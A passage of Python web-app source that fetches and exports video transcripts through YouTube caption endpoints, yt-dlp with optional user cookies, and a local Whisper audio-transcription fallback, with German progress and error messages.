            for s in tr.fetch() if (s.text or "").strip()]
    return segs, tr.language_code


def _yt_video_id(url: str) -> str:
    m = (re.search(r"youtu\.be/([A-Za-z0-9_-]{6,})", url or "")
         or re.search(r"youtube\.com/(?:watch\?.*?v=|shorts/|embed/|live/)([A-Za-z0-9_-]{6,})",
                      url or ""))
    return m.group(1) if m else ""


async def _transcript_via_api(url: str, prefer_lang: str,
                              job_id: str = "") -> tuple[list[dict], str]:
    """Second, independent transcript path.

    yt-dlp fetches subtitles through YouTube's player API; youtube-transcript-api
    reads the published caption track through the timedtext endpoint, a
    lighter request. Returns (segments, language_code).
    """
    vid = _yt_video_id(url)
    if not vid:
        return [], ""

    _stage(job_id, 15, "Untertitel werden abgerufen…")
    try:
        segs, lang = await asyncio.to_thread(_fetch_transcript_sync, vid, prefer_lang, "")
        if segs:
            return segs, lang
    except Exception:
        pass

    if private_ext:
        return await private_ext.transcript_fallback(
            vid, prefer_lang, _fetch_transcript_sync,
            lambda pct, label: _stage(job_id, pct, label))
    return [], ""


def _pick_sub_file(job_id: str, prefer_lang: str) -> Path | None:
    """Pick the best subtitle file: json3 over vtt, preferred language, manual over auto."""
    files = [f for f in TMP_DIR.glob(f"{job_id}*")
             if f.suffix.lower() in (".json3", ".vtt", ".srv3")]
    if not files:
        return None

    def score(f: Path) -> int:
        name = f.name.lower()
        s = 0
        if f.suffix.lower() == ".json3":
            s += 20                      # clean, timed, no karaoke overlap
        if prefer_lang and f".{prefer_lang.lower()}." in name:
            s += 10
        if "-orig" in name:
            s += 4                       # original-language track
        if "auto" not in name:
            s += 1                       # slight preference for manual subs
        return s

    return sorted(files, key=score, reverse=True)[0]


def _parse_sub_file(path: Path) -> list[dict]:
    raw = path.read_text(encoding="utf-8", errors="replace")
    if path.suffix.lower() == ".json3":
        segs = json3_to_segments(raw)
        if segs:
            return segs
    return vtt_to_segments(raw)


async def _fetch_subs(job_id: str, url: str, sub_langs: str, cookies: str = "") -> tuple[int, str]:
    """One yt-dlp call that writes subtitle files. Returns (returncode, stderr).
    json3 first (clean + timed)."""
    out_base = TMP_DIR / job_id
    ck = None
    if cookies and cookies.strip():
        ck = TMP_DIR / f"{job_id}_ck.txt"
        ck.write_text(cookies.strip())
    base = (["--cookies", str(ck)] if ck else []) + [
        "--write-auto-sub", "--write-sub",
        "--sub-langs", sub_langs,
        "--sub-format", "json3/vtt/best",
        "--skip-download", "--no-playlist",
        *_yt_extractor_args(bool(ck)),
        "-o", str(out_base), "--", url,
    ]

    code, _, err = await run_ytdlp(base)
    got = any(TMP_DIR.glob(f"{job_id}*"))

    if not got and private_ext:
        again = await private_ext.retry_ytdlp(
            run_ytdlp, base, err, lambda _o: any(TMP_DIR.glob(f"{job_id}*")),
            refresh_on_stale=True)
        if again:
            code, _, err, used = again
            if used:
                jobs.get(job_id, {})["via_proxy"] = True

    if ck and ck.exists():
        ck.unlink()
    return code, err


# ── Whisper: the transcript path that needs no subtitle track ─────────────────
# Every other stage depends on a published subtitle track. This one needs only
# the audio, and it works on videos that never had subtitles.

_whisper_model = None
_whisper_lock = asyncio.Semaphore(WHISPER_CONCURRENCY)

# Apple Silicon runs Whisper on the Neural Engine through MLX, which is a
# different league from int8 on four server cores — the practical effect is
# that a laptop can afford large-v3-turbo where the VPS can only afford base,
# and on German that gap is the difference between searchable and quotable.
# Not available in a container: Docker on macOS has no access to the ANE.
_MLX_REPOS = {
    "large-v3-turbo": "mlx-community/whisper-large-v3-turbo",
    "large-v3": "mlx-community/whisper-large-v3-mlx",
    "medium": "mlx-community/whisper-medium-mlx",
    "small": "mlx-community/whisper-small-mlx",
    "base": "mlx-community/whisper-base-mlx",
}


def _mlx_available() -> bool:
    if not LOCAL_MODE:
        return False
    try:
        import mlx_whisper  # noqa: F401
        return True
    except Exception:
        return False


def _load_whisper():
    """Load once and keep. First call downloads the model (~150 MB for base)."""
    global _whisper_model
    if _whisper_model is None:
        from faster_whisper import WhisperModel
        Path(WHISPER_MODEL_DIR).mkdir(parents=True, exist_ok=True)
        # faster-whisper does not know the MLX model names; fall back to a
        # size it recognises rather than failing at load time.
        size = WHISPER_MODEL if WHISPER_MODEL in (
            "tiny", "base", "small", "medium", "large-v2", "large-v3") else "base"
        _whisper_model = WhisperModel(
            size, device="cpu", compute_type="int8",
            download_root=WHISPER_MODEL_DIR, num_workers=1,
        )
    return _whisper_model


async def _download_audio(job_id: str, url: str, cookies: str = "") -> Path | None:
    """Fetch audio only — a tenth the bytes of the video, and enough to read."""
    out = TMP_DIR / f"{job_id}_audio.%(ext)s"
    ck = None
    if cookies and cookies.strip():
        ck = TMP_DIR / f"{job_id}_wck.txt"
        ck.write_text(cookies.strip())
    args = (["--cookies", str(ck)] if ck else []) + [
        "-f", "bestaudio[ext=m4a]/bestaudio/best",
        "-x", "--audio-format", "mp3", "--audio-quality", "5",
        "--no-playlist", *_yt_extractor_args(bool(ck)),
        "-o", str(out), "--", url,
    ]
    code, _, err = await run_ytdlp(args)
    if ck:
        ck.unlink(missing_ok=True)
    if code != 0:
        log_error("whisper-audio", (err or "")[:300], url)
        return None
    hits = sorted(TMP_DIR.glob(f"{job_id}_audio.*"))
    return hits[0] if hits else None


def _whisper_knows(code: str) -> bool:
    """Whether Whisper has this language. Asks the installed engine; if
    neither is importable (tests, a server without Whisper), says yes and
    leaves the decision to whoever transcribes."""
    try:
        from faster_whisper.tokenizer import _LANGUAGE_CODES
        return code in _LANGUAGE_CODES
    except Exception:
        pass
    try:
        from mlx_whisper.tokenizer import LANGUAGES
        return code in LANGUAGES
    except Exception:
        return True


async def _whisper_segments(path: Path, lang: str, prompt: str = "",
                            timeout: float = 0) -> tuple[list[dict], str]:
    """Transcribe locally. Bounded by WHISPER_CONCURRENCY (one by default):
    two concurrent runs would swap the VPS to death, and the queue is
    friendlier than an OOM kill.

    `prompt` is Whisper's initial_prompt: names and terms it would otherwise
    spell by ear. Already capped by the caller."""
    initial = prompt or None
    # Every caller, not just the podcast path: a region tag ("en-gb") makes
    # both engines refuse the whole file.
    if lang and lang not in ("native", "auto"):
        lang = safe_lang(lang, "")
    # A code Whisper does not know ("na", "xx") makes it reject the file;
    # letting it detect the language costs nothing.
    if lang and lang not in ("native", "auto") and not _whisper_knows(lang):
        lang = ""
    lang = lang or "native"

    def _run_mlx() -> tuple[list[dict], str]:
        import mlx_whisper
        repo = _MLX_REPOS.get(WHISPER_MODEL, _MLX_REPOS["large-v3-turbo"])
        res = mlx_whisper.transcribe(
            str(path), path_or_hf_repo=repo,
            language=(lang if lang and lang != "native" else None),
            condition_on_previous_text=False,
            initial_prompt=initial,
        )
        out = []
        for s in res.get("segments", []):
            text = re.sub(r"\s+", " ", s.get("text") or "").strip()
            if text:
                start, end = float(s.get("start", 0)), float(s.get("end", 0))
                out.append({"start": start, "dur": max(0.0, end - start), "text": text})
        return out, (res.get("language") or lang or "")

    def _run() -> tuple[list[dict], str]:
        model = _load_whisper()
        segs, info = model.transcribe(
            str(path),
            beam_size=WHISPER_BEAM,
            vad_filter=True,                       # skips silence, big speedup
            language=(lang if lang and lang != "native" else None),
            condition_on_previous_text=False,      # avoids repetition loops
            initial_prompt=initial,
        )
        out = []
        for s in segs:
            text = re.sub(r"\s+", " ", s.text or "").strip()
            if text:
                out.append({"start": float(s.start),
                            "dur": max(0.0, float(s.end) - float(s.start)),
                            "text": text})
        return out, (info.language or lang or "")

    def _either() -> tuple[list[dict], str]:
        if _mlx_available():
            try:
                return _run_mlx()
            except Exception as e:
                # A missing model download or an unsupported chip should cost
                # quality, not the transcript. Fall through to the CPU path.
                log_error("whisper-mlx", str(e)[:200])
        return _run()

    # The slot is held until the thread has really finished. A thread cannot
    # be cancelled: if the waiting coroutine gives up (timeout, client gone),
    # the computation goes on, and releasing the slot then would let the next
    # run start next to it. The timeout covers the run only, not the queue.
    await _whisper_lock.acquire()
    task = asyncio.ensure_future(asyncio.to_thread(_either))
    handed_off = False
    try:
        if timeout:
            return await asyncio.wait_for(asyncio.shield(task), timeout)
        return await asyncio.shield(task)
    except (asyncio.CancelledError, asyncio.TimeoutError):
        if not task.done():
            task.add_done_callback(lambda _t: _whisper_lock.release())
            handed_off = True
        raise
    finally:
        if not handed_off:
            _whisper_lock.release()


async def _transcript_via_whisper(job_id: str, url: str, lang: str,
                                  cookies: str = "", prompt: str = "") -> tuple[list[dict], str]:
    """Audio → text. Returns ([], "") when unavailable rather than raising —
    this is the last stage, and a crash here would hide every earlier reason."""
    if not WHISPER_ENABLED or not _extractor_installed():
        return [], ""
    # Fetching YouTube audio is media retrieval from YouTube, so the same
    # switch that governs video downloads governs it. Before 10/2026 this
    # path ignored the switch: with an extractor present, a "video off"
    # instance still pulled audio for the Whisper fallback.
    if _is_youtube(url) and not youtube_video_enabled():
        return [], ""
    audio = None
    try:
        _stage(job_id, 70, "Kein Untertitel vorhanden — Ton wird geholt…")
        audio = await _download_audio(job_id, url, cookies)
        if not audio:
            return [], ""

        dur = await _media_duration(audio)
        if dur and dur > WHISPER_MAX_MINUTES * 60:
            log_error("whisper", f"Zu lang: {int(dur // 60)} min", url)
            return [], ""

        mins = max(1, int((dur or 0) // 60))
        _stage(job_id, 78, f"Ton wird transkribiert (~{mins} Min Material)…")
        return await _whisper_segments(audio, lang, prompt=prompt)
    except Exception as e:
        log_error("whisper", str(e)[:300], url)
        return [], ""
    finally:
        if audio:
            audio.unlink(missing_ok=True)


async def _media_duration(path: Path) -> float:
    """Seconds, or 0 when ffprobe cannot tell."""
    try:
        proc = await asyncio.create_subprocess_exec(
            "ffprobe", "-v", "error", *_UPLOAD_FF_GUARD,
            "-show_entries", "format=duration",
            "-of", "default=noprint_wrappers=1:nokey=1", str(path),
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.DEVNULL)
        try:
            out, _ = await asyncio.wait_for(proc.communicate(), 30)
        except asyncio.TimeoutError:
            proc.kill()
            return 0.0
        return float((out or b"").decode().strip() or 0)
    except Exception:
        return 0.0


# ffmpeg decides the format from the content, not the extension. A ".mp3"
# that is really an HLS or concat playlist would make it open other files or
# URLs. Uploads are read with local files only and a fixed set of demuxers.
_UPLOAD_FF_GUARD = ["-protocol_whitelist", "file",
                    "-format_whitelist",
                    "mov,mp4,m4a,3gp,3g2,mj2,mp3,wav,ogg,flac,aac,matroska,webm"]


async def _normalise_upload(src: Path) -> Path | None:
    """Re-encode an upload to 16 kHz mono WAV under the guard above, so the
    transcriber never parses the uploaded container itself."""
    out = src.with_name(src.stem + "_norm.wav")
    try:
        proc = await asyncio.create_subprocess_exec(
            "ffmpeg", "-nostdin", "-v", "error", *_UPLOAD_FF_GUARD, "-i", str(src),
            "-vn", "-ac", "1", "-ar", "16000", "-y", str(out),
            stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
        try:
            await asyncio.wait_for(proc.wait(), 600)
        except asyncio.TimeoutError:
            proc.kill()
            out.unlink(missing_ok=True)
            return None
        return out if proc.returncode == 0 and out.exists() else None
    except Exception:
        out.unlink(missing_ok=True)
        return None


def _finish_transcript(job_id: str, segments: list[dict], used: str, meta: dict, via_api: bool):
    text = segments_to_text(segments)
    meta["used_lang"] = used
    jobs[job_id].update({
        "status": "done", "transcript": text, "word_count": len(text.split()),
        "segments": segments, "timestamped": segments_to_timestamped(segments),
        "duration": round(segments[-1]["start"] + (segments[-1]["dur"] or 0)) if segments else 0,
        "used_lang": used, "meta": meta, "via_api": via_api,
    })


def _stage(job_id: str, pct: int, label: str):
    """Report progress so the UI can show what is actually happening — a fetch
    can take a while."""
    j = jobs.get(job_id)
    if j is not None:
        j["progress"], j["stage"] = pct, label


async def _transcript_job(job_id: str, url: str, lang: str, user_id: int | None = None,
                          prompt: str = ""):
    """Wrapper with a hard deadline — no path may hang the UI indefinitely.

    The budget is the fast-path ceiling plus, when local transcription is on,
    room for it to finish. Both are wall clock, not per stage: a request that
    spent 70 s on the fast path must not then get a fresh full Whisper budget.
    """
    budget = TRANSCRIPT_TIMEOUT + (WHISPER_TIMEOUT if WHISPER_ENABLED else 0)
    try:
        await asyncio.wait_for(_transcript_job_inner(job_id, url, lang, user_id,
                                                     prompt=prompt),
                               timeout=budget)
    except asyncio.TimeoutError:
        job = jobs.get(job_id, {})
        if job.get("status") not in ("done", "no_subs"):
            job.update({
                "status": "no_subs", "progress": 100, "stage": "", "blocked": True,
                "meta": job.get("meta") or {"webpage_url": url},
                "error": (f"Abgebrochen nach {budget} Sekunden — die Plattform "
                          "antwortet nicht oder blockt. Mit hinterlegten Cookies geht es "
                          "meist sofort; sonst den Whisper-Befehl unten lokal ausführen."),
            })
            log_error("Transkript", f"Timeout nach {budget}s", url)


async def _transcript_job_inner(job_id: str, url: str, lang: str, user_id: int | None = None,
                                prompt: str = ""):
    jobs[job_id]["status"] = "running"
    _stage(job_id, 5, "Video wird geprüft…")
    is_yt = _is_youtube(url)
    # Per-platform cookie store (the user's own signed-in session).
    cookies = db.get_cookies(user_id, "youtube" if is_yt else "instagram") if user_id else ""
    prefer = "en" if lang == "native" else lang

    # ── Fast path for YouTube ────────────────────────────────────────────────
    # The timedtext endpoint is one small request; yt-dlp does a full
    # extraction. So: text first, and fetch the title in parallel via oEmbed
    # (YouTube's public metadata endpoint, no player API).
    if is_yt:
        meta_task = asyncio.create_task(_yt_oembed(url))
        # With the user's own cookies yt-dlp runs as their signed-in session.
        if cookies.strip():
            _stage(job_id, 15, "Untertitel werden geholt (mit Cookies)…")
            code, err = await _fetch_subs(job_id, url, f"{prefer},{prefer}-orig,en,de", cookies)
            chosen = _pick_sub_file(job_id, prefer)
            if chosen:
                segs = _parse_sub_file(chosen)
                m = re.search(r"\.([a-zA-Z-]{2,7})\.(?:json3|vtt|srv3)$", chosen.name)
                for f in TMP_DIR.glob(f"{job_id}*"):
                    f.unlink(missing_ok=True)
                meta = await meta_task or {"webpage_url": url, "chapters": []}
                meta["extractor"] = "YouTube"
                _finish_transcript(job_id, segs, m.group(1) if m else prefer, meta, False)
                return
            for f in TMP_DIR.glob(f"{job_id}*"):
                f.unlink(missing_ok=True)

        segments, used = await _transcript_via_api(url, prefer, job_id)
        meta = await meta_task or {}
        if segments:
            meta = meta or {"title": "", "uploader": "", "webpage_url": url, "chapters": []}
            meta["extractor"] = "YouTube"
            _finish_transcript(job_id, segments, used or prefer, meta, True)
            return
    else:
        meta = {}

    # YouTube: wenn der schnelle Weg scheitert, scheitert yt-dlp genauso — es
    # ist dieselbe Ablehnung, nur langsamer. Gemessen: Minuten Warten für
    # dasselbe Ergebnis. Also abkürzen und stattdessen den Weg gehen, der keine
    # Untertitelspur braucht: Ton holen und selbst transkribieren.
    if is_yt:
        meta = meta or {"webpage_url": url, "chapters": []}
        meta["extractor"] = "YouTube"

        segments, used = await _transcript_via_whisper(job_id, url, prefer, cookies,
                                                       prompt=prompt)
        if segments:
            meta["via_whisper"] = True
            _finish_transcript(job_id, segments, used or prefer, meta, True)
            return

        caption = await _fetch_caption(url) if cookies else ""
        # Say which wall was hit. With YouTube media switched off, the audio
        # was never requested, and blaming a blocked server address sent
        # people looking for a problem that did not exist.
        if not youtube_video_enabled():
            msg = ("Dieses Video hat keine Untertitel. Den Ton zum Transkribieren holt "
                   "Fundus nur, wenn YouTube-Medien eingeschaltet sind (System → Medien, "
                   "auf Servern ENABLE_YOUTUBE_VIDEO=1).")
            blocked = False
        else:
            msg = ("YouTube lehnt Anfragen von der Adresse dieses Servers ab, und auch "
                   "der Ton ließ sich nicht laden. Nutze die Desktop-App oder "
                   "veröffentlichte Untertitel — oder den Whisper-Befehl unten "
                   "lokal ausführen.")
            blocked = True
        jobs[job_id].update({
            "status": "no_subs", "caption": caption, "meta": meta, "blocked": blocked,
            "progress": 100, "stage": "", "error": msg,
        })
        log_error("Transkript", "Kein Weg erfolgreich (Untertitel + Whisper)", url)
        return

    # ── Full path: yt-dlp (Untertitel bei Nicht-YouTube-Plattformen) ─────────
    _stage(job_id, 70, "Erweiterte Suche (yt-dlp)…")
    if not meta.get("title"):
        meta = await _fetch_light_meta(url, cookies)
    meta["extractor"] = _platform_of(url)

    if lang == "native":
        detected = meta.get("language", "")
        sub_langs = f"{detected},{detected}-orig,en,de" if detected else "en,de"
        prefer = detected or "en"
    else:
        sub_langs = f"{lang},{lang}-orig,en"

    code, err = await _fetch_subs(job_id, url, sub_langs, cookies)
    chosen = _pick_sub_file(job_id, prefer)

    if not chosen and not is_yt:
        # Widen the net once: any available language, any format.
        await _fetch_subs(job_id, url, "all", cookies)
        chosen = _pick_sub_file(job_id, prefer)

    if not chosen:
        for f in TMP_DIR.glob(f"{job_id}*"):
            f.unlink(missing_ok=True)
        blocked = "not a bot" in (err or "").lower() or "sign in to confirm" in (err or "").lower()
        # Reels, TikToks and most short videos carry no subtitle track at
        # all, so for them the spoken text only exists in the audio. Same
        # route YouTube takes above: fetch the audio, transcribe it here.
        if not blocked:
            segments, used = await _transcript_via_whisper(job_id, url, prefer, cookies,
                                                           prompt=prompt)
            if segments:
                meta["via_whisper"] = True
                _finish_transcript(job_id, segments, used or prefer, meta, True)
                return
        # Nothing spoken to be had: fall back to the written caption/description.
        caption = await _fetch_caption(url)
        jobs[job_id].update({
            "status": "no_subs", "caption": caption, "meta": meta,
            "blocked": blocked,
            "error": ("YouTube lehnt Anfragen von der Adresse dieses Servers ab. Nutze "
                      "die Desktop-App oder veröffentlichte Untertitel — oder den "
                      "Whisper-Befehl unten lokal ausführen."
                      if blocked else
                      YTDLP_MISSING if not _extractor_installed() else
                      "Keine Untertitel vorhanden — für gesprochenen Text bitte den "
                      "Whisper-Befehl unten auf dem Mac ausführen."),
        })
        log_error("Transkript", (err or "")[-400:] or "Keine Untertitel gefunden", url)
        return

    segments = _parse_sub_file(chosen)
    # Language actually used = code embedded in the chosen filename, else detected.
    m = re.search(r"\.([a-zA-Z-]{2,7})\.(?:json3|vtt|srv3)$", chosen.name)
    used_lang = m.group(1) if m else prefer

    for f in TMP_DIR.glob(f"{job_id}*"):
        f.unlink(missing_ok=True)

    _finish_transcript(job_id, segments, used_lang, meta, False)


# ── Transcript export (txt · srt · vtt · json · md) ───────────────────────────

def _safe_filename(name: str) -> str:
    """Strip path separators and control characters — the name comes from the
    user's template and ends up in a Content-Disposition header."""
    name = re.sub(r"[\\/\x00-\x1f\"\r\n]+", "", name).strip().strip(".")
    return name[:120] or "transkript"


def _render_filename(template: str, meta: dict, url: str) -> str:
    """Expand [title] · [id] · [uploader] · [publishDate] · [currentDate]."""
    vid = ""
    m = (re.search(r"youtu\.be/([A-Za-z0-9_-]{6,})", url or "")
         or re.search(r"[?&]v=([A-Za-z0-9_-]{6,})", url or "")
         or re.search(r"/(?:shorts|embed|live)/([A-Za-z0-9_-]{6,})", url or ""))
    if m:
        vid = m.group(1)
    values = {
        "title": meta.get("title") or "transkript",
        "id": vid,
        "uploader": meta.get("uploader") or "",
        "publishdate": _fmt_date(meta.get("upload_date") or "") if meta.get("upload_date") else "",
        "currentdate": datetime.now().strftime("%Y-%m-%d"),
    }
    out = template or "[title]"
    for key, val in values.items():
        out = re.sub(rf"\[{key}\]", str(val), out, flags=re.I)
    return _safe_filename(out)


@app.get("/api/transcript/{job_id}/export.{fmt}")
async def transcript_export(job_id: str, fmt: str, request: Request, timing: bool = True,
                            filename: str = "", user: dict = Depends(current_user)):
    """Export a transcript.

    `timing=false` strips timestamps where the format allows it (txt/md).
    `filename` is a template — [title], [id], [uploader], [publishDate],
    [currentDate] — matching what people expect from transcript tools.
    """
    import json as _json
    job = jobs.get(job_id)
    if not job or job.get("user_id") != user["id"] or job.get("status") != "done":
        raise HTTPException(404, "Transkript nicht gefunden")
    segs = job.get("segments") or []
    meta = job.get("meta") or {}
    title = meta.get("title") or "transkript"

    if filename.strip():
        base = _render_filename(filename, meta, job.get("url", ""))
        slug = re.sub(r"\s+", "_", base)
    else:
        slug = re.sub(r"[^a-z0-9]+", "-", title.lower()).strip("-")[:60] or "transkript"

    if fmt == "srt":
        body, media = segments_to_srt(segs), "application/x-subrip"
    elif fmt == "vtt":
        body, media = segments_to_vtt(segs), "text/vtt"
    elif fmt == "json":
        body = _json.dumps({
            "title": title, "url": meta.get("webpage_url"),
            "uploader": meta.get("uploader"), "upload_date": meta.get("upload_date"),
            "language": job.get("used_lang"), "word_count": job.get("word_count"),
            "duration": job.get("duration"),
            "text": job.get("transcript"), "segments": segs,
        }, ensure_ascii=False, indent=2)
        media = "application/json"
    elif fmt == "md":
        # Labels in the reader's language: the file leaves the app and gets
        # read, quoted and fed to assistants elsewhere.
        lang = _brand_ctx(request)["lang"]
        L = lambda k: (lambda v: v[:1].upper() + v[1:])(i18n.translate(k, lang))
        lines = [f"# {title}", ""]
        if meta.get("webpage_url"): lines.append(f"- **{L('Quelle')}:** {meta['webpage_url']}")
        if meta.get("uploader"): lines.append(f"- **Creator:** {meta['uploader']}")
        if meta.get("upload_date"): lines.append(f"- **{L('Datum')}:** {_fmt_date(meta['upload_date'])}")
        lines += [f"- **{L('Sprache')}:** {job.get('used_lang') or '-'}",
                  f"- **{L('Wörter')}:** {job.get('word_count')}", "", f"## {L('Transkript')}", "",
                  segments_to_timestamped(segs) if timing else (job.get("transcript") or "")]
        body, media = "\n".join(lines) + "\n", "text/markdown"
    elif fmt == "ts":
        body, media = segments_to_timestamped(segs), "text/plain"
    elif fmt == "txt":
        body = segments_to_timestamped(segs) if timing else (job.get("transcript") or "")
        media = "text/plain"
    else:
        # export.pdf used to answer 200 with a text file under that name.
        raise HTTPException(400, "Format: txt, md, srt, vtt, json or ts.")

    ext = "txt" if fmt == "ts" else fmt
    name = f"{slug}.{ext}"
    return PlainTextResponse(body, headers={
        "Content-Disposition": content_disposition(name),
        "Content-Type": f"{media}; charset=utf-8",
    })


async def _fetch_caption(url: str) -> str:
    """Return the post caption / description text (Instagram) or video description."""
    code, stdout, stderr = await run_ytdlp([
        "--skip-download", "--no-playlist",
        "--print", "%(description)s", "--", url,
    ])
    text = (stdout or "").strip()
    if text and text.lower() != "none":
        return text
    return ""
